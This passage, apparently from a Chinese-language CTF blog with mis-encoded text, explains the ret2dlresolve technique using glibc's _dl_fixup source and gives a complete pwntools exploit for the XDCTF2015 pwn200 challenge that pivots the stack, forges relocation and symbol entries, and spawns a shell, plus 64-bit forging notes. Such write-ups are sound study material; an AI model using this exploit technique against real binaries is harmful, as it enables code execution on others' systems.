class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">first time each PLT entry is called. We must perform the relocation</span></span><br><span class="line"><span class="comment">specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">to that address. Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">function. */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"><span class="type">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation. */</span></span><br><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up the target symbol. If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">used don&#x27;t look in the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We need to keep the scope around so do some locking. This is</span></span><br><span class="line"><span class="comment">not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">we are not using any threads (yet). */</span></span><br><span class="line"><span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We are done with the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">of the object that defines sym. Now add in the symbol</span></span><br><span class="line"><span class="comment">offset. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* And now perhaps the relocation addend. */</span></span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Finally, fix up the plt itself. */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* All references to the value of l_info[DT_PLTGOT],</span></span><br><span class="line"><span class="comment">l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span></span><br><span class="line"><span class="comment">l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span></span><br><span class="line"><span class="comment">have to be accessed via the D_PTR macro. The macro is needed since for</span></span><br><span class="line"><span class="comment">most architectures the entry is already relocated - but for some not</span></span><br><span class="line"><span class="comment">and we need to relocate at access time. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>ËØ•ÂáΩÊï∞Êü•ÊâæÂáΩÊï∞ÂØπÂ∫îÁöÑÈáçÂÆö‰ΩçË°®È°πÈÄöËøá:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure><p>Âç≥ÈÄöËøá<code>link_map</code>‰∏≠ÁöÑ<code>l_info</code>Êï∞ÁªÑ‰∏≠ÁöÑ<code>DT_JMPREL</code>È°πÊâæÂà∞<code>.rel.plt</code>Âú∞ÂùÄÔºåÂä†‰∏äÂÖàÂâç‰º†ÂÖ•ÂèÇÊï∞<code>reloc_arg</code>ÁöÑÂÅèÁßª„ÄÇËøôÈáåÁöÑÂà©Áî®ÊñπÊ≥ïÂ∞±ÊòØÈÄöËøá‰º†ÂÖ•ÈîôËØØÁöÑ<code>reloc_arg</code>Ôºå‰ΩøÂÖ∂Êü•ÊâæÂà∞Êàë‰ª¨‰º™ÈÄ†Â•ΩÁöÑ<code>.rel.plt</code>È°πÔºåÂÆûÁé∞ÂØπÈáçÂÆö‰ΩçÈ°πÁöÑÂä´ÊåÅÔºåËß£Êûê‰∏∫Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂáΩÊï∞„ÄÇ</p><p>Áî±Âª∂ËøüÁªëÂÆöÁöÑÊú∫Âà∂ÂèØÁü•ÔºåÊàë‰ª¨ÈúÄË¶ÅÂÖàÂéãÊ†àÊàë‰ª¨ÈúÄË¶ÅÁöÑ<code>reloc_arg</code>ÔºåÈöèÂêéË∞ÉÁî®<code>plt0</code>„ÄÇÂπ∂Âú®ÂØπÂ∫îÂú∞ÂùÄ‰∏ä‰º™ÈÄ†Â•Ω<code>.rel.plt</code>Ôºå<code>dynsym</code>Ôºå<code>dynstr</code>„ÄÇÂú®<code>dynstr</code>‰∏≠ÂÜôÂÖ•ÊÉ≥Ë¶ÅËß£ÊûêÁöÑ‰ªªÊÑèÂáΩÊï∞Âç≥ÂèØ„ÄÇ</p><p>ÂÖ∑‰Ωì‰º™ÈÄ†ÊñπÊ≥ï‰ª•XDCTF2015 pwn200‰∏∫‰æã</p><h2 id="‰æã"><a href="#‰æã" class="headerlink" title="‰æã"></a>‰æã</h2><p>È¢òÁõÆÊ∫êÁ†Å</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¢òÁõÆ‰∏∫32‰ΩçÔºåÂè™ÂºÄ‰∫ÜNXÔºåPartial RELRO<br>Áî±‰∫éÊ∫¢Âá∫ÈïøÂ∫¶‰∏çÂ§üÔºåÊàë‰ª¨ÂÖàËøõË°å‰∏ÄÊ¨°Ê†àËøÅÁßªÔºåÂú®Â∑≤Áü•ÁöÑÁõÆÊ†áÂú∞ÂùÄ‰∏äÂÜôÂÖ•Êàë‰ª¨ÁöÑ‰º™ÈÄ†È°π<br>expÂ¶Ç‰∏ã:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import*</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">debug</span><span class="params">(cmd = <span class="string">&#x27;&#x27;):</span></span></span><br><span class="line"><span class="string"><span class="params">if len(sys.argv)!=1:</span></span></span><br><span class="line"><span class="string"><span class="params">return</span></span></span><br><span class="line"><span class="string"><span class="params">cmd += &quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">b system</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">gdb.attach(p, cmd)</span></span></span><br><span class="line"><span class="string"><span class="params">pause()</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">def exp(host = &quot;0.0.0.0&quot;, port=11451, exe = &quot;./vuln&quot;):</span></span></span><br><span class="line"><span class="string"><span class="params">  global p</span></span></span><br><span class="line"><span class="string"><span class="params">  if len(sys.argv)==1:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = process(exe)</span></span></span><br><span class="line"><span class="string"><span class="params">  else:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = remote(host, port)</span></span></span><br><span class="line"><span class="string"><span class="params">  pass</span></span></span><br><span class="line"><span class="string"><span class="params">  elf = ELF(&#x27;</span>./vuln<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  leave_ret = 0x08049105</span></span></span><br><span class="line"><span class="string"><span class="params">  pop3 = 0x080491e9</span></span></span><br><span class="line"><span class="string"><span class="params">  pop_ebp = 0x080491eb</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  write_plt = elf.plt[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  write_got = elf.got[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  read_plt = elf.plt[&#x27;</span>read<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  plt_0    = elf.get_section_by_name(&#x27;</span>.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  rel_plt  = elf.get_section_by_name(&#x27;</span>.rel.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  dynsym   = elf.get_section_by_name(&#x27;</span>.dynsym<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  dynstr   = elf.get_section_by_name(&#x27;</span>.dynstr<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  bss_addr = elf.get_section_by_name(&#x27;</span>.bss<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  text_addr = elf.get_section_by_name(&#x27;</span>.text<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  base_addr = bss_addr + 0x800</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = b&quot;\x00&quot; * (112)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([read_plt, pop3, 0, base_addr, 0x100, pop_ebp, base_addr -4, leave_ret])</span></span></span><br><span class="line"><span class="string"><span class="params">  p.recv()</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  reloc_index = base_addr + 24 - rel_plt </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr = base_addr + 32</span></span></span><br><span class="line"><span class="string"><span class="params">  align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr += align</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  r_sym = int((fake_sym_addr - dynsym) / 0x10)</span></span></span><br><span class="line"><span class="string"><span class="params">  r_type = 0x7</span></span></span><br><span class="line"><span class="string"><span class="params">  r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_reloc = flat([write_got, r_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  st_name = fake_sym_addr + 0x10 - dynstr</span></span></span><br><span class="line"><span class="string"><span class="params">  st_bind = 0x1</span></span></span><br><span class="line"><span class="string"><span class="params">  st_type = 0x2</span></span></span><br><span class="line"><span class="string"><span class="params">  st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym = flat([st_name, 0, 0, st_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = flat([plt_0, reloc_index, 0x08049196, base_addr + 0x80, 0, 0])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_reloc</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;\x00&quot; * align</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_sym</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;system\x00&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x80, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([b&quot;/bin/sh\x00&quot;])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x100, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span></span><br><span class="line"><span class="string"><span class="params">exp()</span></span></span><br><span class="line"><span class="string"><span class="params">p.interactive()</span></span></span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèdlÁõ∏ÂÖ≥ÂáΩÊï∞Âç†Áî®ËæÉÂ§öÊ†àÁ©∫Èó¥ÔºåËøÅÁßª‰πãÂêéÂèØËÉΩÂá∫Áé∞Ê†àÁîüÈïøÂà∞ÂÖ∂‰ªñ‰∏çÂèØÂÜôÊÆµÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ËøÅÁßªÁöÑÂú∞ÂùÄÈúÄË¶ÅÁ¶ªbssË∂≥Â§üËøú„ÄÇ</p><h2 id="64‰ΩçÊÉÖÂÜµ"><a href="#64‰ΩçÊÉÖÂÜµ" class="headerlink" title="64‰ΩçÊÉÖÂÜµ"></a>64‰ΩçÊÉÖÂÜµ</h2><p>Â≠òÂú®‰ª•‰∏ãÂå∫Âà´:</p><ul><li>Âú®32‰Ωç‰∏≠Ôºå<code>reloc_arg</code>‰Ωú‰∏∫ÂÅèÁßªÈáèÔºåËÄåÂú®64‰Ωç‰∏≠‰Ωú‰∏∫<code>.rel.plt</code>ÁöÑÊï∞ÁªÑ‰∏ãÊ†á</li><li>ÁªìÊûÑ‰ΩìÂùáÂçáÁ∫ß‰∏∫64‰ΩçÁâàÊú¨</li><li>versionÈóÆÈ¢ò<br>versionÈóÆÈ¢òÂ¶Ç‰∏ã<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>Ê≠§Â§ÑÊää<code>(reloc-&gt;r_info)&gt;&gt;32</code>‰Ωú‰∏∫‰∏ãÊ†áÂèñÂÄº<code>vernum</code>ÔºåÁî±‰∫éÊàë‰ª¨‰º™ÈÄ†ÁöÑ<code>(reloc-&gt;r_info)&gt;&gt;32</code>ÂæàÂ§ßÔºåÂØºËá¥ÂÆπÊòìÂèñÂà∞‰∏çÂèØËØªÂå∫Âüü„ÄÇ</li></ul><p>Ëß£ÂÜ≥ÊñπÊ≥ï‰πã‰∏ÄÊòØÈÅøÂÖçËøõÂÖ•ËØ•Âæ™ÁéØÔºåÂç≥‰ΩøÂæó<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>‰∏∫0ÔºåÂú∞ÂùÄ‰∏∫<code>link_map+0x1c8</code>„ÄÇÁÑ∂ËÄåËøôÈúÄË¶ÅÊ≥ÑÈú≤ldÂú∞ÂùÄÔºåÈÉΩÊúâÂú∞ÂùÄ‰∫ÜËøòÊâìret2dlÂ∞±‰∏çÁ§ºË≤å‰∫Ü„ÄÇ</p><p>Âè¶‰∏ÄÁßçËß£ÂÜ≥ÊñπÊ°àÊòØÈÄâÊã©‰∏çËøõÂÖ•<code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code>ÁöÑÂ§ßÂæ™ÁéØÔºåËÄåÊòØËµ∞elseÂàÜÊîØ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, l-&gt;addr + sym-&gt;st_value);</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>DL_FIXUP_MAKE_VALUE</code>Áî®‰∫éËÆ°ÁÆóÂáΩÊï∞ÁúüÂÆûÂÄº„ÄÇÊàë‰ª¨Âè™ÈúÄÂ∞Ü<code>sym-&gt;st_value</code>ÊåáÂêëÊüê‰∏™Â∑≤Ëß£ÊûêÂáΩÊï∞ÁöÑgotË°®Ôºå<code>l-&gt;addr</code>ÊåáÂêëÁõÆÊ†áÂáΩÊï∞ÂíåÂ∑≤Ëß£ÊûêÂáΩÊï∞ÁöÑÂÅèÁßª„ÄÇ</p><p>Âú®‰∏çÊ≥ÑÈú≤ldÁöÑÊÉÖÂÜµ‰∏ã‰º™ÈÄ†<code>l-&gt;addr</code>ÔºåÊàë‰ª¨ÈúÄË¶Å‰º™ÈÄ†<code>link_map</code>Ôºå‰∏ÄËà¨ÈúÄË¶ÅÊª°Ë∂≥:<br>1.<code>link_map</code>‰∏≠ÁöÑ<code>DT_STRTAB</code>„ÄÅ<code>DT_SYMTAB</code>„ÄÅ<code>DT_JMPREL</code>ÂèØËØª<br>2.<code>DT_SYMTAB</code>ÁªìÊûÑ‰Ωì‰∏≠ÁöÑ<code>d_ptr</code>Âç≥<code>sym</code>Ôºå<code>*(sym+5) &amp; 0x03 != 0</code><br>3.<code>(reloc-&gt;r_info)&amp;0xff == 7</code><br>4.<code>rel_addr = l-&gt;addr + reloc-&gt;r_offset</code>Âç≥ÂéüÂÖàÈúÄË¶Å‰øÆÊîπÁöÑgotË°®Âú∞ÂùÄÊúâÂèØÂÜôÊùÉÈôê<br>5.<code>l-&gt;l_addr + sym-&gt;st_value</code> ‰∏∫systemÁöÑÂú∞ÂùÄ</p><h1 id="dl-finiÁöÑÂà©Áî®"><a href="#dl-finiÁöÑÂà©Áî®" class="headerlink" title="_dl_finiÁöÑÂà©Áî®"></a><code>_dl_fini</code>ÁöÑÂà©Áî®</h1><h2 